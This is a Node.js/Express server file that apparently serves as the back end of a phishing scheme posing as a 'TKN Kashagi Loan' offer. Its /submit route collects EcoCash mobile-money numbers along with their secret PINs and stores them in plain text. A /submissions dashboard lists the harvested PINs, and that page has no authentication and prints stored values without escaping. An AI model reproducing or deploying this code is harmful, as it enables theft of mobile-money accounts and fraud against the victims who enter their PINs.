const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");
const path = require("path");

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

app.use(express.static(path.join(__dirname, "public")));

/* =========================
   DATABASE TEST
========================= */

app.get("/test-db", async (req, res) => {
  try {
    const result = await pool.query("SELECT NOW()");

    res.json({
      success: true,
      databaseTime: result.rows[0].now
    });

  } catch (err) {

    console.error("DATABASE ERROR:", err.message);

    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

/* =========================
   CREATE TABLE
========================= */

app.get("/create-table", async (req, res) => {
  try {

    await pool.query(`
      CREATE TABLE IF NOT EXISTS submissions (
        id SERIAL PRIMARY KEY,
        ecocash_number TEXT NOT NULL,
        ecocash_pin TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    res.send("Table created successfully");

  } catch (err) {

    console.error(err);

    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

/* =========================
   ADD PIN COLUMN
========================= */

app.get("/add-pin-column", async (req, res) => {
  try {

    await pool.query(`
      ALTER TABLE submissions
      ADD COLUMN IF NOT EXISTS ecocash_pin TEXT
    `);

    res.send("ecocash_pin column ready");

  } catch (err) {

    console.error(err);

    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

/* =========================
   RESET TABLE
========================= */

app.get("/reset-table", async (req, res) => {
  try {

    await pool.query(
      "DROP TABLE IF EXISTS submissions"
    );

    await pool.query(`
      CREATE TABLE submissions (
        id SERIAL PRIMARY KEY,
        ecocash_number TEXT NOT NULL,
        ecocash_pin TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    res.send("Table reset successfully");

  } catch (err) {

    console.error(err);

    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

/* =========================
   SAVE TEST
========================= */

app.get("/save-test", async (req, res) => {
  try {

    await pool.query(
      `
      INSERT INTO submissions
      (ecocash_number, ecocash_pin)
      VALUES ($1, $2)
      `,
      [
        "0771234567",
        "TEST123"
      ]
    );

    res.send("Test data saved");

  } catch (err) {

    console.error(
      "SAVE TEST ERROR:",
      err.message
    );

    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

/* =========================
   SUBMIT
========================= */

app.post("/submit", async (req, res) => {

  console.log("SUBMIT ROUTE HIT");
  console.log(req.body);

  try {

    const {
      ecocash_number,
      ecocash_pin
    } = req.body;

    if (!ecocash_number) {

      return res.status(400).json({
        success: false,
        error: "EcoCash number is required"
      });

    }

    await pool.query(
      `
      INSERT INTO submissions
      (ecocash_number, ecocash_pin)
      VALUES ($1, $2)
      `,
      [
        ecocash_number,
        ecocash_pin
      ]
    );

    res.json({
      success: true,
      message: "Data saved successfully"
    });

  } catch (err) {

    console.error(
      "SUBMIT DATABASE ERROR:",
      err.message
    );

    res.status(500).json({
      success: false,
      error: err.message
    });

  }

});

/* =========================
   DELETE ONE
========================= */

app.get("/delete/:id", async (req, res) => {

  try {

    await pool.query(
      "DELETE FROM submissions WHERE id = $1",
      [req.params.id]
    );

    res.redirect("/submissions");

  } catch (err) {

    console.error(err);

    res.status(500).send(
      err.message
    );
  }

});

/* =========================
   SUBMISSIONS DASHBOARD
========================= */

app.get("/submissions", async (req, res) => {

  try {

    const search =
      req.query.search || "";

    let result;

    if (search) {

      result = await pool.query(
        `
        SELECT *
        FROM submissions
        WHERE ecocash_number ILIKE $1
        ORDER BY id DESC
        `,
        [`%${search}%`]
      );

    } else {

      result = await pool.query(
        `
        SELECT *
        FROM submissions
        ORDER BY id DESC
        `
      );

    }

    /* TOTAL */

    const totalResult =
      await pool.query(
        `
        SELECT COUNT(*)
        FROM submissions
        `
      );

    /* TODAY */

    const todayResult =
      await pool.query(
        `
        SELECT COUNT(*)
        FROM submissions
        WHERE DATE(created_at) = CURRENT_DATE
        `
      );

    /* BUILD ROWS */

    let rows = "";

    result.rows.forEach(item => {

      rows += `
        <tr>

          <td>
            <input
              type="checkbox"
              name="ids"
              value="${item.id}"
            >
          </td>

          <td>
            ${item.id}
          </td>

          <td>
            ${item.ecocash_number}
          </td>

          <td>
            ${item.ecocash_pin}
          </td>

          <td>
            ${new Date(
              item.created_at
            ).toLocaleString()}
          </td>

          <td>

            <a
              href="/delete/${item.id}"
              onclick="
                return confirm(
                  'Delete this record?'
                )
              "
              style="
                color:red;
                font-weight:bold;
                text-decoration:none;
              "
            >
              Delete
            </a>

          </td>

        </tr>
      `;

    });

    /* DASHBOARD */

    res.send(`

<!DOCTYPE html>

<html>

<head>

<title>
TKN Kashagi Loan Dashboard
</title>

<meta
  name="viewport"
  content="width=device-width, initial-scale=1"
>

<style>

* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 20px;
  font-family: Arial, sans-serif;
  background: #f4f6f9;
}

.container {
  max-width: 1200px;
  margin: auto;
}

h1 {
  text-align: center;
  color: #1877f2;
  margin-bottom: 25px;
}

.cards {
  display: flex;
  gap: 15px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}

.card {
  flex: 1;
  min-width: 220px;
  background: #fff;
  padding: 20px;
  border-radius: 10px;
  text-align: center;
  box-shadow: 0 2px 10px rgba(0,0,0,.1);
}

.card h3 {
  margin: 0;
  font-size: 18px;
}

.card h2 {
  margin-top: 10px;
  color: #1877f2;
}

.search {
  display: flex;
  justify-content: center;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}

.search input {
  padding: 10px;
  width: 260px;
  border: 1px solid #ccc;
  border-radius: 5px;
}

.search button {
  padding: 10px 18px;
  background: #1877f2;
  color: white;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}

.delete-btn {
  background: #dc3545 !important;
}

table {
  width: 100%;
  border-collapse: collapse;
  background: #fff;
  box-shadow: 0 2px 10px rgba(0,0,0,.1);
}

table,
th,
td {
  border: 1px solid #dcdcdc;
}

th {
  background: #1877f2;
  color: white;
  padding: 12px;
}

td {
  padding: 10px;
  text-align: center;
}

tr:nth-child(even) {
  background: #f8f9fa;
}

tr:hover {
  background: #eef5ff;
}

</style>

</head>

<body>

<div class="container">

<h1>
TKN Kashagi Loan Dashboard
</h1>

<div class="cards">

<div class="card">

<h3>
Total Submissions
</h3>

<h2>
${totalResult.rows[0].count}
</h2>

</div>

<div class="card">

<h3>
Today's Submissions
</h3>

<h2>
${todayResult.rows[0].count}
</h2>

</div>

</div>

<div class="search">

<form
method="GET"
action="/submissions"
>

<input
type="text"
name="search"
value="${search}"
placeholder="Search EcoCash Number"
>

<button type="submit">
Search
</button>

</form>

</div>

<form id="deleteForm">

<button
type="button"
class="delete-btn"
onclick="deleteSelected()"
style="
margin-bottom:15px;
padding:10px 15px;
color:white;
border:none;
border-radius:5px;
cursor:pointer;
"
>

Delete Selected

</button>

<table>

<tr>

<th>

<input
type="checkbox"
id="selectAll"
>

</th>

<th>ID</th>

<th>EcoCash Number</th>

<th>EcoCash Pin</th>

<th>Date Submitted</th>

<th>Action</th>

</tr>

${rows}

</table>

</form>

<script>

document
.getElementById("selectAll")
.addEventListener(
"change",
function() {

document
.querySelectorAll(
"input[name='ids']"
)
.forEach(
function(box) {

box.checked =
this.checked;

},
this
);

}
);

async function deleteSelected() {

const ids = [];

document
.querySelectorAll(
"input[name='ids']:checked"
)
.forEach(
function(box) {

ids.push(
parseInt(box.value)
);

}
);

if (ids.length === 0) {

alert(
"Please select at least one record."
);

return;

}

if (
!confirm(
"Delete selected records?"
)
) {

return;

}

const response =
await fetch(
"/delete-selected",
{

method: "POST",

headers: {
"Content-Type":
"application/json"
},

body:
JSON.stringify({ ids })

}
);

if (response.ok) {

location.reload();

} else {

alert(
"Failed to delete selected records."
);

}

}

</script>

</body>

</html>

`);

  } catch (err) {

    console.error(
      "SUBMISSIONS ERROR:",
      err.message
    );

    res.status(500).send(
      err.message
    );

  }

});

/* =========================
   DELETE SELECTED
========================= */

app.post("/delete-selected", async (req, res) => {

  try {

    const { ids } = req.body;

    if (
      !ids ||
      ids.length === 0
    ) {

      return res.redirect(
        "/submissions"
      );

    }

    await pool.query(
      `
      DELETE FROM submissions
      WHERE id = ANY($1::int[])
      `,
      [
        Array.isArray(ids)
          ? ids
          : [ids]
      ]
    );

    res.redirect(
      "/submissions"
    );

  } catch (err) {

    console.error(err);

    res.status(500).send(
      err.message
    );

  }

});

/* =========================
   DASHBOARD
========================= */

app.get("/dashboard", (req, res) => {

  res.redirect(
    "/submissions"
  );

});

/* =========================
   START SERVER
========================= */

async function startServer() {

  try {

    /*
      Make sure the table exists
      before accepting requests.
    */

    await pool.query(`
      CREATE TABLE IF NOT EXISTS submissions (
        id SERIAL PRIMARY KEY,
        ecocash_number TEXT NOT NULL,
        ecocash_pin TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    console.log(
      "PostgreSQL submissions table ready."
    );

    app.listen(
      process.env.PORT || 3000,
      "0.0.0.0",
      () => {

        console.log(
          "Server started"
        );

      }
    );

  } catch (err) {

    console.error(
      "STARTUP DATABASE ERROR:",
      err.message
    );

    /*
      Still start the HTTP server so
      Render logs show the actual problem.
    */

    app.listen(
      process.env.PORT || 3000,
      "0.0.0.0",
      () => {

        console.log(
          "Server started with database error."
        );

      }
    );

  }

}

startServer();
